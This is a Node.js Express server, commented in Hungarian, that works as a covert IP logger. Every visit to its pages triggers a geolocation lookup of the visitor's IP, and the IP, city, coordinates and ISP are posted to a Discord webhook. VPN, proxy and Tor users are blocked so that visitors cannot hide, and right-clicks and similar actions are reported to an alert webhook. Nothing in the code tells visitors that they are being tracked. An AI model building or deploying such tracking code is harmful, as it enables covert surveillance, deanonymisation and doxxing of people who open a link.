require('dotenv').config();

const express = require('express');
const axios = require('axios');
const path = require('path');
const fs = require('fs');
const app = express();

const PORT = process.env.PORT || 3000;
const MAIN_WEBHOOK = process.env.MAIN_WEBHOOK;
const ALERT_WEBHOOK = process.env.ALERT_WEBHOOK;
const PROXYCHECK_API_KEY = process.env.PROXYCHECK_API_KEY;

// ---- Magyarosított formázó minden fontos adattal ----
function formatGeoDataMagyar(geo) {
  if (!geo || Object.keys(geo).length === 0) return '**Ismeretlen adatok**';
  return (
    `**IP-cím:** ${geo.ip || 'Ismeretlen'}\n` +
    `**Sikeres lekérdezés:** ${geo.success || 'Ismeretlen'}\n` +
    `**Típus:** ${geo.type || 'Ismeretlen'}\n` +
    `**Kontinens:** ${geo.continent || 'Ismeretlen'}\n` +
    `**Kontinens kód:** ${geo.continent_code || 'Ismeretlen'}\n` +
    `**Ország:** ${geo.country || 'Ismeretlen'}\n` +
    `**Országkód:** ${geo.country_code || 'Ismeretlen'}\n` +
    `**Ország zászló:** ${geo.country_flag || 'Ismeretlen'}\n` +
    `**Főváros:** ${geo.country_capital || 'Ismeretlen'}\n` +
    `**Ország hívószám:** ${geo.country_phone || 'Ismeretlen'}\n` +
    `**Szomszédos országok:** ${geo.country_neighbours || 'Ismeretlen'}\n` +
    `**Régió:** ${geo.region || 'Ismeretlen'}\n` +
    `**Város:** ${geo.city || 'Ismeretlen'}\n` +
    `**Szélesség:** ${geo.latitude || 'Ismeretlen'}\n` +
    `**Hosszúság:** ${geo.longitude || 'Ismeretlen'}\n` +
    `**ASN:** ${geo.asn || 'Ismeretlen'}\n` +
    `**Szervezet:** ${geo.org || 'Ismeretlen'}\n` +
    `**Hálózat:** ${geo.isp || 'Ismeretlen'}\n` +
    `**Időzóna:** ${geo.timezone || 'Ismeretlen'}\n` +
    `**Időzóna neve:** ${geo.timezone_name || 'Ismeretlen'}\n` +
    `**Időzóna nyári idő eltolás:** ${geo.timezone_dstOffset || 'Ismeretlen'}\n` +
    `**Időzóna GMT eltolás:** ${geo.timezone_gmtOffset || 'Ismeretlen'}\n` +
    `**Időzóna GMT:** ${geo.timezone_gmt || 'Ismeretlen'}\n` +
    `**Valuta:** ${geo.currency || 'Ismeretlen'}\n` +
    `**Valuta kód:** ${geo.currency_code || 'Ismeretlen'}\n` +
    `**Valuta szimbólum:** ${geo.currency_symbol || 'Ismeretlen'}\n` +
    `**Valuta árfolyam:** ${geo.currency_rates || 'Ismeretlen'}\n` +
    `**Valuta többes:** ${geo.currency_plural || 'Ismeretlen'}\n`
  );
}

// ---- IP lekérés minden lehetőséggel ----
function getClientIp(req) {
  if (req.headers['cf-connecting-ip']) {
    return req.headers['cf-connecting-ip'];
  }
  if (req.headers['x-real-ip']) {
    return req.headers['x-real-ip'];
  }
  if (req.headers['x-forwarded-for']) {
    return req.headers['x-forwarded-for'].split(',')[0].trim();
  }
  return (req.socket.remoteAddress || req.connection.remoteAddress || '').replace(/^.*:/, '');
}

// ---- Geo adatok ipwhois.app API-ból, kulcs nélkül! ----
async function getGeo(ip) {
  try {
    const geo = await axios.get(`https://ipwhois.app/json/${ip}`);
    if (geo.data.success === false || geo.data.type === 'error') {
      return {};
    }
    return geo.data;
  } catch (e) {
    console.log('ipwhois.app hiba:', e.message);
    return {};
  }
}

// ---- VPN/Proxy check proxycheck.io-val ----
async function isVpnProxy(ip) {
  try {
    const url = `https://proxycheck.io/v2/${ip}?key=${PROXYCHECK_API_KEY}&vpn=1&asn=1&node=1`;
    const res = await axios.get(url);
    if (res.data && res.data[ip]) {
      // proxy vagy VPN: "yes"
      return res.data[ip].proxy === "yes" || res.data[ip].type === "VPN";
    }
    return false;
  } catch (e) {
    console.log("proxycheck.io hiba:", e.message);
    return false;
  }
}

// --- Főoldal (/) ---   <<< EZ A FŐOLDAL (szaby) --->
app.get('/', async (req, res) => {
  const ip = getClientIp(req);
  const geoData = await getGeo(ip);

  // LOGOLÁS - itt direkt "szaby"-t írunk az oldalhoz!
  axios.post(MAIN_WEBHOOK, {
    username: "Helyszíni Naplózó <3",
    avatar_url: "https://i.pinimg.com/736x/bc/56/a6/bc56a648f77fdd64ae5702a8943d36ae.jpg",
    content: '',
    embeds: [{
      title: 'Új látogató az oldalon!',
      description: `**Oldal:** /szaby\n` +      // <- ITT!!!
                   `**IP-cím:** ${ip}\n` +
                   formatGeoDataMagyar(geoData),
      color: 0x800080
    }]
  }).catch(()=>{});

  // VPN/PROXY ellenőrzés és ALERT log
  if (await isVpnProxy(ip)) {
    axios.post(ALERT_WEBHOOK, {
      username: "VPN figyelő <3",
      avatar_url: "https://i.pinimg.com/736x/bc/56/a6/bc56a648f77fdd64ae5702a8943d36ae.jpg",
      content: '',
      embeds: [{
        title: 'VPN/proxy vagy TOR-ral próbálkozás!',
        description: `**Oldal:** /szaby\n` +
                     `**IP-cím:** ${ip}\n` +
                     formatGeoDataMagyar(geoData),
        color: 0xff0000
      }]
    }).catch(()=>{});
    return res.status(403).send('VPN/proxy vagy TOR használata tiltott ezen az oldalon! 🚫');
  }

  // index.html visszaadása (főoldal)
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// --- Dinamikus oldalak: pl. /kecske, /barmi ---
app.get('/:folder', async (req, res, next) => {
  const folderName = req.params.folder;
  if (folderName === 'report') return next();

  // Keresi: public/FOLDER/index.html
  const dirPath = path.join(__dirname, 'public', folderName);
  const filePath = path.join(dirPath, 'index.html');
  if (!fs.existsSync(filePath)) return next();

  const ip = getClientIp(req);
  const geoData = await getGeo(ip);

  // FŐ WEBHOOK LOG (ország, város, IP stb.)
  axios.post(MAIN_WEBHOOK, {
    username: "Helyszíni Naplózó <3",
    avatar_url: "https://i.pinimg.com/736x/bc/56/a6/bc56a648f77fdd64ae5702a8943d36ae.jpg",
    content: '',
    embeds: [{
      title: 'Új látogató az oldalon!',
      description: `**Oldal:** /${folderName}\n` +
                   `**IP-cím:** ${ip}\n` +
                   formatGeoDataMagyar(geoData),
      color: 0x800080
    }]
  }).catch(()=>{});

  // VPN/PROXY ellenőrzés és ALERT log
  if (await isVpnProxy(ip)) {
    axios.post(ALERT_WEBHOOK, {
      username: "VPN figyelő <3",
      avatar_url: "https://i.pinimg.com/736x/bc/56/a6/bc56a648f77fdd64ae5702a8943d36ae.jpg",
      content: '',
      embeds: [{
        title: 'VPN/proxy vagy TOR-ral próbálkozás!',
        description: `**Oldal:** /${folderName}\n` +
                     `**IP-cím:** ${ip}\n` +
                     formatGeoDataMagyar(geoData),
        color: 0xff0000
      }]
    }).catch(()=>{});
    return res.status(403).send('VPN/proxy vagy TOR használata tiltott ezen az oldalon! 🚫');
  }

  // index.html visszaadása
  res.sendFile(filePath);
});

// --- Gyanús tevékenység reportolása (rossz kombinációk, jobb klikk stb.) ---
app.post('/report', express.json(), async (req, res) => {
  const ip = getClientIp(req);
  const { reason, page } = req.body;
  const geoData = await getGeo(ip);

  axios.post(ALERT_WEBHOOK, {
    username: "Riasztóbot <3",
    avatar_url: "https://i.pinimg.com/736x/bc/56/a6/bc56a648f77fdd64ae5702a8943d36ae.jpg",
    content: '',
    embeds: [{
      title: 'Gyanús tevékenység!',
      description:
        `**Oldal:** ${page || 'Ismeretlen'}\n` +
        `**Művelet:** ${reason}\n` +
        `**IP-cím:** ${ip}\n` +
        formatGeoDataMagyar(geoData),
      color: 0xff0000
    }]
  }).catch(()=>{});

  res.json({ ok: true });
});

// --- Statikus fájlok kiszolgálása mappán belül (pl. /szaby/style.css, /kecske/script.js) ---
app.use(express.static(path.join(__dirname, 'public')));

// --- 404 minden másra ---
app.use((req, res) => {
  res.status(404).send('404 Not Found');
});

app.listen(PORT, () => {
  console.log(`Szerver elindult: http://localhost:${PORT}`);
});
